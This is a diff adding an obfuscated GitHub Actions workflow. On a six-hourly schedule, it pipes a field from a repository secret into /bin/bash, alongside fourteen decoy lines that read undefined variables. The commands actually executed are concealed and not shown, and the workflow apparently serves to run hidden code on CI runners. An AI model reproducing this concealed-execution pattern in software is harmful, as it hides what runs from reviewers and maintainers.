@@ -1,0 +1,33 @@
+name: congenxiwei
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '13 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: congenxiwei
+        env:
+          oezpp223: ${{ secrets.oezpp223 }}
+        run: |
+          echo $oezpp223 | jq -r .t1098 | /bin/bash
+          echo $sr3 | jq -r .av67928 | /bin/bash
+          echo $zbcvj692 | jq -r .zjiw16143 | /bin/bash
+          echo $kxde5 | jq -r .loqp62 | /bin/bash
+          echo $zvgrk0 | jq -r .wda43 | /bin/bash
+          echo $xbj20931 | jq -r .faci920 | /bin/bash
+          echo $herh2076 | jq -r .fuql40 | /bin/bash
+          echo $rm8896 | jq -r .o5 | /bin/bash
+          echo $m9683 | jq -r .xcx25 | /bin/bash
+          echo $ake2 | jq -r .zc5581 | /bin/bash
+          echo $qcqtb9 | jq -r .izber48 | /bin/bash
+          echo $jru974 | jq -r .bkud18574 | /bin/bash
+          echo $vt96535 | jq -r .uzmsm612 | /bin/bash
+          echo $vr78 | jq -r .oqjr09902 | /bin/bash
+          echo $rfi9 | jq -r .dr17386 | /bin/bash
+
